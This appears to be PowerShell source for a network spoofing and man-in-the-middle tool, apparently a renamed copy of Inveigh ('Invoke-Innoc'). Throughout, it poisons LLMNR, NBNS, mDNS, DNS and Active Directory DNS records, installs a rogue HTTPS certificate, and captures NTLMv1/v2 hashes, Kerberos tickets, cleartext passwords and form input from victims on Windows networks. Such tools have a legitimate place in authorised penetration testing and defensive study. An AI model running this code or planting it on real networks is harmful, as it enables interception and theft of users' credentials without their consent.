function Invoke-Innoc
{
<#
.SYNOPSIS
This function is a Windows PowerShell THIS/LLMNR/NBNS/mDNS/DNS spoofer.

.DESCRIPTION
This function is a Windows PowerShell THIS/LLMNR/NBNS/mDNS/DNS spoofer/man-in-the-middle tool with
challenge/response capture over HTTP/HTTPS/Proxy/SMB.

.PARAMETER THIS
Default = None: (Combo/NS/Wildcard) List of THIS spoofing attacks. Combo looks at LLMNR/NBNS requests and adds
...
This is primarily for the GQBL bypass for wpad. This attack can be used with Innoc's DNS spoofer. Wildcard injects a wildcard record.

.PARAMETER THISACE
Default = Enabled: Enable/Disable adding an 'Authenticated Users' full control ACE to any added records.

.PARAMETER THISCleanup
Default = Enabled: Enable/Disable removing added THIS records upon shutdown.

.PARAMETER THISCredential
PSCredential object that will be used with THIS spoofing.

.PARAMETER THISDomain
The targeted domain in DNS format.

.PARAMETER THISDomainController
Domain controller to target. This parameter is mandatory on a non-domain attached system.

.PARAMETER THISForest
The targeted forest in DNS format.

.PARAMETER THISHostsIgnore
Comma separated list of hosts that will be ignored with THIS spoofing.

.PARAMETER THISNSTarget
Default = wpad2: Target for the NS attacks NS record. An existing record can be used. 

.PARAMETER THISPartition
Default = DomainDNSZones: (DomainDNSZones,ForestDNSZones,System) The AD partition name where the zone is stored.

.PARAMETER THISThreshold
Default = 4: The threshold used to determine when THIS records are injected for the combo attack. Innoc will
...
This is primarily required for the THIS NS wpad attack.

.PARAMETER DNSTTL
Default = 30 Seconds: DNS TTL in seconds for the response packet.

.PARAMETER Elevated
Default = Auto: (Auto/Y/N) Set the privilege mode. Auto will determine if Innoc is running with
...
Default = Innoc: The issuer field for the cert that will be installed for HTTPS.
...
running Innoc through a shell that does not return other output streams. Note that you will not see the various
...
elevated privilege. If using 'Memory', the packets will be written to the $Innoc.pcap ArrayList.
...
prevent login requests from being processed by the Innoc host.  
...
.PARAMETER SpooferIP
IP address for THIS/LLMNR/mDNS/NBNS spoofing. This parameter is only necessary when redirecting victims to a system
other than the Innoc host.
...
Default = Disabled: (Y/N) Enable/Disable LLMNR/NBNS valid host learning. If enabled, Innoc will send out
LLMNR/NBNS requests for any received LLMNR/NBNS requests. If a response is received, Innoc will add the
hostname to a spoofing blacklist.

.PARAMETER SpooferLearningDelay
(Integer) Time in minutes that Innoc will delay spoofing while valid hosts are being blacklisted through
SpooferLearning.

.PARAMETER SpooferLearningInterval
Default = 30 Minutes: (Integer) Time in minutes that Innoc wait before sending out an LLMNR/NBNS request for a
...
(Integer) Number of matching LLMNR/NBNS name requests to receive before Innoc will begin responding to those
requests.

.PARAMETER SpooferThresholdNetwork
(Integer) Number of matching LLMNR/NBNS requests to receive from different systems before Innoc will begin
...
.EXAMPLE
Invoke-Innoc -HTTPResponse "<html><head><meta http-equiv='refresh' content='0; url=https://duckduckgo.com/'></head></html>"
Execute specifying an HTTP redirect response. 

.LINK
https://github.com/Kevin-Robertson/Innoc
#>
...
param
( 
    [parameter(Mandatory=$false)][Array]$THISHostsIgnore = ("isatap","wpad"),
    ...
    [parameter(Mandatory=$false)][Int]$THISThreshold = "4",
    [parameter(Mandatory=$false)][Int]$THISTTL = "600",
    ...
    [parameter(Mandatory=$false)][String]$THISDomain = "",
    [parameter(Mandatory=$false)][String]$THISDomainController = "",
    [parameter(Mandatory=$false)][String]$THISForest = "",
    [parameter(Mandatory=$false)][String]$THISNS = "wpad",
    [parameter(Mandatory=$false)][String]$THISNSTarget = "wpad2",
    [parameter(Mandatory=$false)][String]$THISZone = "",
    ...
    [parameter(Mandatory=$false)][String]$HTTPSCertIssuer = "Innoc",
    ...
    [parameter(Mandatory=$false)][ValidateSet("Combo","NS","Wildcard")][Array]$THIS,
    [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones","System")][String]$THISPartition = "DomainDNSZones",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$THISACE = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$THISCleanup = "Y",
    ...
    [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$THISCredential,
...
if($THIS)
{
    ...
    if(!$THISDomainController -or !$THISDomain -or $THISForest -or !$THISZone)
    {
        ...
        if(!$THISDomainController)
        {
            $THISDomainController = $current_domain.PdcRoleOwner.Name
        }
    
        if(!$THISDomain)
        {
            $THISDomain = $current_domain.Name
        }

        if(!$THISForest)
        {
            $THISForest = $current_domain.Forest
        }
    
        if(!$THISZone)
        {
            $THISZone = $current_domain.Name
        }
...
if(!$Innoc)
{
    $global:Innoc = [HashTable]::Synchronized(@{})
    $Innoc.cleartext_list = New-Object System.Collections.ArrayList
    $Innoc.enumerate = New-Object System.Collections.ArrayList
    $Innoc.IP_capture_list = New-Object System.Collections.ArrayList
    $Innoc.log = New-Object System.Collections.ArrayList
    $Innoc.kerberos_TGT_list = New-Object System.Collections.ArrayList
    $Innoc.kerberos_TGT_username_list = New-Object System.Collections.ArrayList
    $Innoc.NTLMv1_list = New-Object System.Collections.ArrayList
    $Innoc.NTLMv1_username_list = New-Object System.Collections.ArrayList
    $Innoc.NTLMv2_list = New-Object System.Collections.ArrayList
    $Innoc.NTLMv2_username_list = New-Object System.Collections.ArrayList
    $Innoc.POST_request_list = New-Object System.Collections.ArrayList
    $Innoc.valid_host_list = New-Object System.Collections.ArrayList
    $Innoc.THIS_table = [HashTable]::Synchronized(@{})
    $Innoc.relay_privilege_table = [HashTable]::Synchronized(@{})
    $Innoc.relay_failed_login_table = [HashTable]::Synchronized(@{})
    $Innoc.relay_history_table = [HashTable]::Synchronized(@{})
    $Innoc.request_table = [HashTable]::Synchronized(@{})
    $Innoc.session_socket_table = [HashTable]::Synchronized(@{})
    $Innoc.session_table = [HashTable]::Synchronized(@{})
    $Innoc.session_message_ID_table = [HashTable]::Synchronized(@{})
    $Innoc.session_lock_table = [HashTable]::Synchronized(@{})
    $Innoc.SMB_session_table = [HashTable]::Synchronized(@{})
    $Innoc.domain_mapping_table = [HashTable]::Synchronized(@{})
    $Innoc.group_table = [HashTable]::Synchronized(@{})
    $Innoc.session_count = 0
    $Innoc.session = @()
}

if($Innoc.running)
{
    Write-Output "[-] Innoc is already running"
    throw
}

$Innoc.stop = $false

if(!$Innoc.relay_running)
{
    $Innoc.cleartext_file_queue = New-Object System.Collections.ArrayList
    $Innoc.console_queue = New-Object System.Collections.ArrayList
    $Innoc.HTTP_challenge_queue = New-Object System.Collections.ArrayList
    $Innoc.log_file_queue = New-Object System.Collections.ArrayList
    $Innoc.NTLMv1_file_queue = New-Object System.Collections.ArrayList
    $Innoc.NTLMv2_file_queue = New-Object System.Collections.ArrayList
    $Innoc.output_queue = New-Object System.Collections.ArrayList
    $Innoc.POST_request_file_queue = New-Object System.Collections.ArrayList
    $Innoc.HTTP_session_table = [HashTable]::Synchronized(@{})
    $Innoc.console_input = $true
    $Innoc.console_output = $false
    $Innoc.file_output = $false
    $Innoc.HTTPS_existing_certificate = $false
    $Innoc.HTTPS_force_certificate_delete = $false
    $Innoc.log_output = $true
    $Innoc.cleartext_out_file = $output_directory + "\Innoc-Cleartext.txt"
    $Innoc.log_out_file = $output_directory + "\Innoc-Log.txt"
    $Innoc.NTLMv1_out_file = $output_directory + "\Innoc-NTLMv1.txt"
    $Innoc.NTLMv2_out_file = $output_directory + "\Innoc-NTLMv2.txt"
    $Innoc.POST_request_out_file = $output_directory + "\Innoc-FormInput.txt"
}
...
$Innoc.hostname_spoof = $false
$Innoc.running = $true

if($StatusOutput -eq 'Y')
{
    $Innoc.status_output = $true
}
else
{
    $Innoc.status_output = $false
}

if($OutputStreamOnly -eq 'Y')
{
    $Innoc.output_stream_only = $true
}
else
{
    $Innoc.output_stream_only = $false
}
...
$Innoc.netBIOS_domain = (Get-ChildItem -path env:userdomain).Value
$Innoc.computer_name = (Get-ChildItem -path env:computername).Value

try
{
    $Innoc.DNS_domain = ((Get-ChildItem -path env:userdnsdomain -ErrorAction 'SilentlyContinue').Value).ToLower()
    $Innoc.DNS_computer_name = ($Innoc.computer_name + "." + $Innoc.DNS_domain).ToLower()

    if(!$Innoc.domain_mapping_table.($Innoc.netBIOS_domain))
    {
        $Innoc.domain_mapping_table.Add($Innoc.netBIOS_domain,$Innoc.DNS_domain)
    }

}
catch
{
    $Innoc.DNS_domain = $Innoc.netBIOS_domain
    $Innoc.DNS_computer_name = $Innoc.computer_name
}

#endregion
#region begin startup messages
$Innoc.output_queue.Add("[*] Innoc $Innoc_version started at $(Get-Date -format s)") > $null
...
if($Elevated -eq 'Y' -or $elevated_privilege)
{
    ...
    {
        $Innoc.output_queue.Add("[+] Elevated Privilege Mode = Enabled")  > $null
    }
    else
    {
        $Innoc.output_queue.Add("[-] Elevated Privilege Mode Enabled But Check Failed")  > $null
    }

}
else
{
    $Innoc.output_queue.Add("[!] Elevated Privilege Mode = Disabled")  > $null
    $SMB = "N"
}

if($firewall_status)
{
    $Innoc.output_queue.Add("[!] Windows Firewall = Enabled")  > $null
}

$Innoc.output_queue.Add("[+] Primary IP Address = $IP")  > $null

if($DNS -eq 'Y' -or $LLMNR -eq 'Y' -or $mDNS -eq 'Y' -or $NBNS -eq 'Y')
{
    $Innoc.output_queue.Add("[+] Spoofer IP Address = $SpooferIP")  > $null
}
...
if($LLMNR -eq 'Y' -or $NBNS -eq 'Y')
{
    ...
    {
        $Innoc.output_queue.Add("[+] Spoofer Threshold Host = $SpooferThresholdHost")  > $null
    }

    if($SpooferThresholdNetwork -gt 0)
    {
        $Innoc.output_queue.Add("[+] Spoofer Threshold Network = $SpooferThresholdNetwork")  > $null
    }
...
{
    $Innoc.THIS = $THIS
    $Innoc.output_queue.Add("[+] THIS Spoofer = $THIS")  > $null
    $Innoc.output_queue.Add("[+] THIS Hosts Ignore = " + ($THISHostsIgnore -join ","))  > $null
    $Innoc.output_queue.Add("[+] THIS Domain Controller = $THISDomainController")  > $null
    $Innoc.output_queue.Add("[+] THIS Domain = $THISDomain")  > $null
    $Innoc.output_queue.Add("[+] THIS Forest = $THISForest")  > $null
    $Innoc.output_queue.Add("[+] THIS TTL = $THISTTL")  > $null
    $Innoc.output_queue.Add("[+] THIS Zone = $THISZone")  > $null

    if($Innoc.THIS -contains 'NS')
    {
        $Innoc.output_queue.Add("[+] THIS NS Record = $THISNS")  > $null
        $Innoc.output_queue.Add("[+] THIS NS Target Record = $THISNSTarget")  > $null
    }

    if($THISACE -eq 'Y')
    {
        $Innoc.output_queue.Add("[+] THIS ACE Add = Enabled")  > $null
    }
    else
    {
        $Innoc.output_queue.Add("[+] THIS ACE Add = Disabled")  > $null    
    }

    if($THISCleanup -eq 'Y')
    {
        $Innoc.output_queue.Add("[+] THIS Cleanup = Enabled")  > $null
    }
    else
    {
        $Innoc.output_queue.Add("[+] THIS Cleanup = Disabled")  > $null    
    }

    if($THIS -eq 'Combo')
    {
        $Innoc.request_table_updated = $true
    }

}
else
{
    $Innoc.output_queue.Add("[+] THIS Spoofer = Disabled")  > $null
}
...
if($DNS -eq 'Y')
{
    ...
    {
        $Innoc.output_queue.Add("[+] DNS Spoofer = Enabled")  > $null
        $Innoc.output_queue.Add("[+] DNS TTL = $DNSTTL Seconds")  > $null
    }
    else
    {
        $DNS = "N"
        $Innoc.output_queue.Add("[-] DNS Spoofer Disabled Due To In Use Port 53")  > $null
    }

}
else
{
    $Innoc.output_queue.Add("[+] DNS Spoofer = Disabled")  > $null
}
...
if($LLMNR -eq 'Y')
{
    ...
    {
        $Innoc.output_queue.Add("[+] LLMNR Spoofer = Enabled")  > $null
        $Innoc.output_queue.Add("[+] LLMNR TTL = $LLMNRTTL Seconds")  > $null
    }
    else
    {
        $LLMNR = "N"
        $Innoc.output_queue.Add("[-] LLMNR Spoofer Disabled Due To In Use Port 5355")  > $null
    }

}
else
{
    $Innoc.output_queue.Add("[+] LLMNR Spoofer = Disabled")  > $null
}
...
if($mDNS -eq 'Y')
{
    ...
    if($elevated_privilege -or !$mDNS_port_check)
    {
        ...
        {
            $Innoc.output_queue.Add("[+] mDNS Spoofer For Type $mDNSTypes_output = Enabled")  > $null
        }
        else
        {
            $Innoc.output_queue.Add("[+] mDNS Spoofer For Types $mDNSTypes_output = Enabled")  > $null
        }

        $Innoc.output_queue.Add("[+] mDNS TTL = $mDNSTTL Seconds")  > $null
    }
    else
    {
        $mDNS = "N"
        $Innoc.output_queue.Add("[-] mDNS Spoofer Disabled Due To In Use Port 5353")  > $null
    }

}
else
{
    $Innoc.output_queue.Add("[+] mDNS Spoofer = Disabled")  > $null
}
...
if($NBNS -eq 'Y')
{
    ...
    {
        $Innoc.output_queue.Add("[+] NBNS Spoofer For Type $NBNSTypes_output = Enabled")  > $null
    }
    else
    {
        $Innoc.output_queue.Add("[+] NBNS Spoofer For Types $NBNSTypes_output = Enabled")  > $null
    }

}
else
{
    $Innoc.output_queue.Add("[+] NBNS Spoofer = Disabled")  > $null
}

if($NBNSBruteForce -eq 'Y')
{   
    $Innoc.output_queue.Add("[+] NBNS Brute Force Spoofer Target = $NBNSBruteForceTarget") > $null
    $Innoc.output_queue.Add("[+] NBNS Brute Force Spoofer IP Address = $SpooferIP") > $null
    $Innoc.output_queue.Add("[+] NBNS Brute Force Spoofer Hostname = $NBNSBruteForceHost") > $null

    if($NBNSBruteForcePause)
    {
        $Innoc.output_queue.Add("[+] NBNS Brute Force Pause = $NBNSBruteForcePause Seconds") > $null
    }
...
{
    $Innoc.output_queue.Add("[+] NBNS TTL = $NBNSTTL Seconds") > $null
}

if($SpooferLearning -eq 'Y' -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    $Innoc.output_queue.Add("[+] Spoofer Learning = Enabled")  > $null

    if($SpooferLearningDelay -eq 1)
    {
        $Innoc.output_queue.Add("[+] Spoofer Learning Delay = $SpooferLearningDelay Minute")  > $null
    }
    elseif($SpooferLearningDelay -gt 1)
    {
        $Innoc.output_queue.Add("[+] Spoofer Learning Delay = $SpooferLearningDelay Minutes")  > $null
    }
    
    if($SpooferLearningInterval -eq 1)
    {
        $Innoc.output_queue.Add("[+] Spoofer Learning Interval = $SpooferLearningInterval Minute")  > $null
    }
    elseif($SpooferLearningInterval -eq 0)
    {
        $Innoc.output_queue.Add("[+] Spoofer Learning Interval = Disabled")  > $null
    }
    elseif($SpooferLearningInterval -gt 1)
    {
        $Innoc.output_queue.Add("[+] Spoofer Learning Interval = $SpooferLearningInterval Minutes")  > $null
    }
...
{
    $Innoc.output_queue.Add("[+] Spoofer Hosts Reply = " + ($SpooferHostsReply -join ","))  > $null
}

if($SpooferHostsIgnore -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    $Innoc.output_queue.Add("[+] Spoofer Hosts Ignore = " + ($SpooferHostsIgnore -join ","))  > $null
}

if($SpooferIPsReply -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    $Innoc.output_queue.Add("[+] Spoofer IPs Reply = " + ($SpooferIPsReply -join ","))  > $null
}

if($SpooferIPsIgnore -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    $Innoc.output_queue.Add("[+] Spoofer IPs Ignore = " + ($SpooferIPsIgnore -join ","))  > $null
}

if($SpooferRepeat -eq 'N')
{
    $Innoc.spoofer_repeat = $false
    $Innoc.output_queue.Add("[+] Spoofer Repeating = Disabled")  > $null
}
else
{
    $Innoc.spoofer_repeat = $true
}

if($SMB -eq 'Y' -and $elevated_privilege)
{
    $Innoc.output_queue.Add("[+] SMB Capture = Enabled")  > $null
}
else
{
    $Innoc.output_queue.Add("[+] SMB Capture = Disabled")  > $null
}
...
if($HTTP -eq 'Y')
{
    ...
    {
        $HTTP = "N"
        $Innoc.output_queue.Add("[-] HTTP Capture Disabled Due To In Use Port $HTTPPort")  > $null
    }
    else
    {
        ...
        {
            $Innoc.output_queue.Add("[+] HTTP IP = $HTTPIP") > $null
        }

        if($HTTPPort -ne 80)
        {
            $Innoc.output_queue.Add("[+] HTTP Port = $HTTPPort") > $null
        }

        $Innoc.output_queue.Add("[+] HTTP Capture = Enabled")  > $null
    }

}
else
{
    $Innoc.output_queue.Add("[+] HTTP Capture = Disabled")  > $null
}
...
if($HTTPS -eq 'Y')
{
    ...
    if($HTTPS_port_check)
    {
        $HTTPS = "N"
        $Innoc.HTTPS = $false
        $Innoc.output_queue.Add("[-] HTTPS Capture Disabled Due To In Use Port $HTTPSPort")  > $null
    }
    else
    {
        ...
        try
        { 
            $Innoc.certificate_issuer = $HTTPSCertIssuer
            $Innoc.certificate_CN = $HTTPSCertSubject
            $Innoc.output_queue.Add("[+] HTTPS Certificate Issuer = " + $Innoc.certificate_issuer)  > $null
            $Innoc.output_queue.Add("[+] HTTPS Certificate CN = " + $Innoc.certificate_CN)  > $null
            $certificate_check = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -Like "CN=" + $Innoc.certificate_issuer})
            ...
            if(!$certificate_check)
            {
                ...
                $certificate_distinguished_name.Encode( "CN=" + $Innoc.certificate_CN, $certificate_distinguished_name.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
                $certificate_issuer_distinguished_name = new-object -com "X509Enrollment.CX500DistinguishedName"
                $certificate_issuer_distinguished_name.Encode("CN=" + $Innoc.certificate_issuer, $certificate_distinguished_name.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
                ...
                $Innoc.certificate = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -match $Innoc.certificate_issuer})
            }
            else
            {
                ...
                {
                    $Innoc.HTTPS_force_certificate_delete = $true
                }

                $Innoc.HTTPS_existing_certificate = $true
                $Innoc.output_queue.Add("[+] HTTPS Capture = Using Existing Certificate")  > $null
            }
            ...
            if($HTTPIP -ne '0.0.0.0')
            { 
                $Innoc.output_queue.Add("[+] HTTPS IP = $HTTPIP") > $null
            }

            if($HTTPSPort -ne 443)
            {   
                $Innoc.output_queue.Add("[+] HTTPS Port = $HTTPSPort") > $null
            }

            $Innoc.output_queue.Add("[+] HTTPS Capture = Enabled")  > $null
        ...
        catch
        {
            $HTTPS = "N"
            $Innoc.HTTPS = $false
            $Innoc.output_queue.Add("[-] HTTPS Capture Disabled Due To Certificate Error")  > $null
        }
...
{
    $Innoc.output_queue.Add("[+] HTTPS Capture = Disabled")  > $null
}

if($HTTP -eq 'Y' -or $HTTPS -eq 'Y')
{
    $Innoc.output_queue.Add("[+] HTTP/HTTPS Authentication = $HTTPAuth")  > $null

    if($HTTPDirectory -and !$HTTPResponse)
    {
        $Innoc.output_queue.Add("[+] HTTP/HTTPS Directory = $HTTPDirectory")  > $null

        if($HTTPDefaultFile)
        {
            $Innoc.output_queue.Add("[+] HTTP/HTTPS Default Response File = $HTTPDefaultFile")  > $null
        }

        if($HTTPDefaultEXE)
        {
            $Innoc.output_queue.Add("[+] HTTP/HTTPS Default Response Executable = $HTTPDefaultEXE")  > $null
        }
    ...
    if($HTTPResponse)
    {
        $Innoc.output_queue.Add("[+] HTTP/HTTPS Response = Enabled")  > $null
    }

    if($HTTPResponse -or $HTTPDirectory -and $HTTPContentType -ne 'html/text')
    {
        $Innoc.output_queue.Add("[+] HTTP/HTTPS/Proxy Content Type = $HTTPContentType")  > $null
    }

    if($HTTPAuth -eq 'Basic' -or $WPADAuth -eq 'Basic')
    {
        $Innoc.output_queue.Add("[+] Basic Authentication Realm = $HTTPBasicRealm")  > $null
    }
    ...
    if($Proxy -eq 'Y')
    {
        ...
        {
            $Proxy = "N"
            $Innoc.output_queue.Add("[-] Proxy Capture Disabled Due To In Use Port $ProxyPort")  > $null
        }
        else
        {
            $Innoc.output_queue.Add("[+] Proxy Capture = Enabled")  > $null
            $Innoc.output_queue.Add("[+] Proxy Port = $ProxyPort") > $null
            $Innoc.output_queue.Add("[+] Proxy Authentication = $ProxyAuth")  > $null
            $ProxyPortFailover = $ProxyPort + 1
            $ProxyIgnore = ($ProxyIgnore | Where-Object {$_ -and $_.Trim()})

            if($ProxyIgnore.Count -gt 0)
            {
                $Innoc.output_queue.Add("[+] Proxy Ignore List = " + ($ProxyIgnore -join ","))  > $null
            }
    ...
    $Innoc.output_queue.Add("[+] WPAD Authentication = $WPADAuth")  > $null
    ...
    if($WPADAuth -like "NTLM*")
    {
        ...
        {
            $Innoc.output_queue.Add("[+] WPAD NTLM Authentication Ignore List = " + ($WPADAuthIgnore -join ","))  > $null
        }
    ...
    if($WPADDirectHosts)
    {
        $Innoc.output_queue.Add("[+] WPAD Direct Hosts = " + ($WPADDirectHosts -join ","))  > $null
    }

    if($WPADResponse -and $Proxy -eq 'N')
    {
        $Innoc.output_queue.Add("[+] WPAD Response = Enabled")  > $null
    }
    elseif($WPADResponse -and $Proxy -eq 'Y')
    {
        $Innoc.output_queue.Add("[+] WPAD Proxy Response = Enabled")  > $null

        if($WPADIP -and $WPADPort)
        {
            $Innoc.output_queue.Add("[+] WPAD Failover = $WPADIP`:$WPADPort")  > $null
        }
    ...
    {
        $Innoc.output_queue.Add("[+] WPAD Response = Enabled")  > $null
        $Innoc.output_queue.Add("[+] WPAD = $WPADIP`:$WPADPort")  > $null
    ...
    if($Challenge)
    {
        $Innoc.output_queue.Add("[+] HTTP NTLM Challenge = $Challenge")  > $null
    }
...
if($Kerberos -eq 'Y')
{
    $Innoc.output_queue.Add("[+] Kerberos TGT Capture = Enabled")  > $null
    $Innoc.output_queue.Add("[+] Kerberos TGT File Output Count = $KerberosCount")  > $null
    
    if($KerberosHostHeader.Count -gt 0)
    {
        $Innoc.output_queue.Add("[+] Kerberos TGT Host Header List = " + ($KerberosHostHeader -join ","))  > $null
    }

}
else
{
    $Innoc.output_queue.Add("[+] Kerberos TGT Capture = Disabled")  > $null    
}

if($MachineAccounts -eq 'N')
{
    $Innoc.output_queue.Add("[+] Machine Account Capture = Disabled")  > $null
    $Innoc.machine_accounts = $false
}
else
{
    $Innoc.output_queue.Add("[+] Machine Account Capture = Enabled")  > $null
    $Innoc.machine_accounts = $true
}
...
if($ConsoleOutput -ne 'N')
{
    ...
    if($ConsoleOutput -ne 'N')
    {
        ...
        {
            $Innoc.output_queue.Add("[+] Console Output = Full")  > $null
        }
        else
        {
            $Innoc.output_queue.Add("[+] Console Output = $ConsoleOutput")  > $null
        }

    }

    $Innoc.console_output = $true

    if($ConsoleStatus -eq 1)
    {
        $Innoc.output_queue.Add("[+] Console Status = $ConsoleStatus Minute")  > $null
    }
    elseif($ConsoleStatus -gt 1)
    {
        $Innoc.output_queue.Add("[+] Console Status = $ConsoleStatus Minutes")  > $null
    }
...
else
{
    ...
    if($Innoc.tool -eq 1)
    {
        $Innoc.output_queue.Add("[+] Console Output Disabled Due To External Tool Selection")  > $null
    }
    else
    {
        $Innoc.output_queue.Add("[+] Console Output = Disabled")  > $null
    }
...
{
    $Innoc.console_unique = $true
}
else
{
    $Innoc.console_unique = $false
}
...
if($FileOutput -eq 'Y' -or ($Kerberos -eq 'Y' -and $KerberosCount -gt 0) -or ($Pcap -eq 'File' -and ($PcapTCP -or $PcapUDP)))
{
    ...
    if($FileOutput -eq 'Y')
    {
        $Innoc.output_queue.Add("[+] File Output = Enabled")  > $null
        $Innoc.file_output = $true
    }

    if($Pcap -eq 'File')
    {
        $Innoc.output_queue.Add("[+] Pcap Output = File") > $null
        
        if($PcapTCP)
        {
            $Innoc.output_queue.Add("[+] Pcap TCP Ports = " + ($PcapTCP -join ","))  > $null
        }

        if($PcapUDP)
        {
            $Innoc.output_queue.Add("[+] Pcap UDP Ports = " + ($PcapUDP -join ","))  > $null
        }

    }

    $Innoc.output_queue.Add("[+] Output Directory = $output_directory")  > $null 
}
else
{
    $Innoc.output_queue.Add("[+] File Output = Disabled")  > $null
}

if($Pcap -eq 'Memory')
{
    $Innoc.output_queue.Add("[+] Pcap Output = Memory")
}

if($FileUnique -eq 'Y')
{
    $Innoc.file_unique = $true
}
else
{
    $Innoc.file_unique = $false
}
...
{
    $Innoc.log_output = $false
}

if($RunCount)
{
    $Innoc.output_queue.Add("[+] Run Count = $RunCount") > $null
}

if($RunTime -eq 1)
{
    $Innoc.output_queue.Add("[+] Run Time = $RunTime Minute")  > $null
}
elseif($RunTime -gt 1)
{
    $Innoc.output_queue.Add("[+] Run Time = $RunTime Minutes")  > $null
}

if($ShowHelp -eq 'Y')
{
    $Innoc.output_queue.Add("[!] Run Stop-Innoc to stop")  > $null

    if($Innoc.console_output)
    {
        $Innoc.output_queue.Add("[*] Press any key to stop console output")  > $null
    }

}

while($Innoc.output_queue.Count -gt 0)
{

    switch -Wildcard ($Innoc.output_queue[0])
    {

        {$_ -like "?`[`!`]*" -or $_ -like "?`[-`]*"}
        {

            if($Innoc.status_output -and $Innoc.output_stream_only)
            {
                Write-Output($Innoc.output_queue[0] + $Innoc.newline)
            }
            elseif($Innoc.status_output)
            {
                Write-Warning($Innoc.output_queue[0])
            }

            if($Innoc.file_output)
            {
                $Innoc.log_file_queue.Add($Innoc.output_queue[0]) > $null
            }

            if($Innoc.log_output)
            {
                $Innoc.log.Add($Innoc.output_queue[0]) > $null
            }

            $Innoc.output_queue.RemoveAt(0)
        }
        ...
        default
        {
            ...
            elseif($Innoc.status_output)
            {
                Write-Output($Innoc.output_queue[0])
            }

            if($Innoc.file_output)
            {

                if ($Innoc.output_queue[0].StartsWith("[+] ") -or $Innoc.output_queue[0].StartsWith("[*] "))
                {
                    $Innoc.log_file_queue.Add($Innoc.output_queue[0]) > $null
                }
                else
                {
                    $Innoc.log_file_queue.Add("[redacted]") > $null    
                }
...
$shared_basic_functions_scriptblock =
{
    ...
    function Get-SpooferResponseMessage
    {
        ...
        elseif($Innoc.valid_host_list -contains $query_string -and ($SpooferHostsReply -notcontains $QueryString -and $SpooferHostsReply -notcontains $query_host))
        {
            $response_message = "[$query_string is a valid host]"
        }
        elseif($SpooferRepeat -eq 'Y' -and $Innoc.IP_capture_list -contains $source_IP.IPAddressToString)
        {
        ...
        elseif($Type -ne 'mDNS' -and $Type -ne 'DNS' -and $SpooferThresholdHost -gt 0 -and @($Innoc.request_table.$QueryString | Where-Object {$_ -match $source_IP.IPAddressToString}).Count -le $SpooferThresholdHost)
        {
            $response_message = "[SpooferThresholdHost >= $(@($Innoc.request_table.$QueryString | Where-Object {$_ -match $source_IP.IPAddressToString}).Count)]"
        }
        elseif($Type -ne 'mDNS' -and $Type -ne 'DNS' -and $SpooferThresholdNetwork -gt 0 -and @($Innoc.request_table.$QueryString | Sort-Object | Get-Unique).Count -le $SpooferThresholdNetwork)
        {
            $response_message = "[SpooferThresholdNetwork >= $(@($Innoc.request_table.$QueryString | Sort-Object | Get-Unique).Count)]"
        }
    ...
    function New-RelayEnumObject
    {
        ...
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Index" $Innoc.enumerate.Count
    ...
    function Invoke-SessionUpdate
    {
        ...
        if($Innoc.domain_mapping_table.$domain)
        {
            $session = ($username + "@" + $Innoc.domain_mapping_table.$domain).ToUpper()
            $hostname_full = ($hostname + "." + $Innoc.domain_mapping_table.$domain).ToUpper()
        }
        else
        {
        ...
        for($i = 0;$i -lt $Innoc.enumerate.Count;$i++)
        {

            if($Innoc.enumerate[$i].Hostname -eq $hostname_full -or $Innoc.enumerate[$i].IP -eq $IP)
            {

                if(!$Innoc.enumerate[$i].Hostname)
                {
                    $Innoc.enumerate[$target_index].Hostname = $hostname_full
                }

                [Array]$session_list = $Innoc.enumerate[$i].Sessions
                ...
                if($Innoc.domain_mapping_table.$domain)
                {
                    ...
                    for($j = 0;$j -lt $session_list.Count;$j++)
                    {
                        ...
                        if($session_list[$j] -like "$domain\*")
                        {
                            ...
                            $session_update = $session_username + "@" + $Innoc.domain_mapping_table.$domain
                            $session_list[$j] += $session_update
                            $Innoc.enumerate[$i].Sessions = $session_list
                        }
        ...
        if(!$target_updated)
        {
            $Innoc.enumerate.Add((New-RelayEnumObject -IP $IP -Hostname $hostname_full -Sessions $session)) > $null
        }
...
$NTLM_functions_scriptblock =
{
    ...
    function Get-NTLMResponse
    {
        ...
        if($NTLMSSP_hex_offset -gt 0 -and $payload_converted.SubString(($NTLMSSP_hex_offset + 16),8) -eq "03000000")
        {
            ...
            $NTLM_challenge = $Innoc.HTTP_session_table.$session
            ...
            if($NTLM_length -gt 24)
            {
                ...
                if($Capture -eq 'Y')
                {
                    ...
                    if($Innoc.machine_accounts -or (!$Innoc.machine_accounts -and -not $NTLM_user_string.EndsWith('$')))
                    {
                        $Innoc.NTLMv2_list.Add($NTLMv2_hash) > $null

                        if(!$Innoc.console_unique -or ($Innoc.console_unique -and $Innoc.NTLMv2_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string"))
                        {
                            $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 captured for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:") > $null
                            $Innoc.output_queue.Add($NTLMv2_hash) > $null
                        }
                        else
                        {
                            $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 captured for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[not unique]") > $null
                        }

                        if($Innoc.file_output -and (!$Innoc.file_unique -or ($Innoc.file_unique -and $Innoc.NTLMv2_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string")))
                        {
                            $Innoc.NTLMv2_file_queue.Add($NTLMv2_hash) > $null
                            $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 written to " + "Innoc-NTLMv2.txt") > $null
                        }

                        if($Innoc.NTLMv2_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string")
                        {
